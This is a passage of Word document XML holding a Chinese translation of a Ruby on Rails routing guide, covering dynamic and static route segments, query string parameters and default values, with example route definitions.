          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 行为，然后把后面的参数 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"1"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 放到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:id]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中以供使用。因为 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:action</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 被圆括号包围，所以，他俩可以被忽略，所以这条规则同样能够将 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PhotosController#index</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B6FBD3"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3.2 动态部分</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E795BB"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你可以设置一条路由规则有任意多的动态部分，除了</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:controller</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:action</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，其他的片段都将会被转换成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的一部分。如果你写了这样的一条路由：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5016"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="57310CCA" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A681D19" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1246766483"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match ':controller/:action/:id/:user_id'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0FC490E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如果收到了 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/show/1/2</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样的请求，将会分发到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PhotosController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 下的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 行为中，而 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:id]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"1"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:user_id]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"2"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F6C60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当你使用了 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:controller</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来匹配路径时你就无法使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:module</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 了。如果你需要像 Resourceful 路由规则一样使用它就需要加上一些正则条件，例如:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8256"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="1A69B651" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5016EC07" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="329410355"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match ':controller(/:action(/:id))', :controller</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; /admin\/[^\/]+/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="64840FE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默认情况下 动态部分无法接收句点————这是因为“点”这个符号已经被用作了匹配类型的分隔符。如果你需要在规则的动态部分中使用句点你就需要加入一些特殊的正则条件来覆写原本的匹配方法 ———— 例如</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> =&gt; /[^\/]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">/ 将会让你的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:id+ 能够匹配除了 斜杠以外的任何字符。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3961E509"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3.3 静态部分</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B9C49E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你可以在创建路由规则的时候指定一个静态的部分：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6216"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="52270D20" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35CB451C" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1542862672"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match ':controller/:action/:id/with_user/:user_id'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3F2F692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这个路由将会生成像这样的路径 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/show/1/with_user/2</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。在这个例子里，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是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>{ :controller =&gt; “photos”, :action =&gt; “show”, :id =&gt; “1”, :user_id =&gt; “2” }</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E2DA69"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3.4 字符串队列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E1B9A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The </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> will also include any parameters from the query string. For example, with this route:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3936"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="2B3A9C9E" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B9CD8EB" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1410275243"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match ':controller/:action/:id'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="02972CC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如果接收到的路径为 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/show/1?user_id=2</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，那么 Rails 会把它分发到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Photos</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制器下面的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 行为中去，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 会是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>{ :controller =&gt; “photos”, :action =&gt; “show”, :id =&gt; “1”, :user_id =&gt; “2” }</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9E47F3"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3.5 设置默认值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3B3E2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如果你需要一个默认的匹配值，你可以用一个没有指定 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:controller</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:action</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的路由规则来实现。像这样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4416"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="1AECCD11" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7ECD095A" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1811900595"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
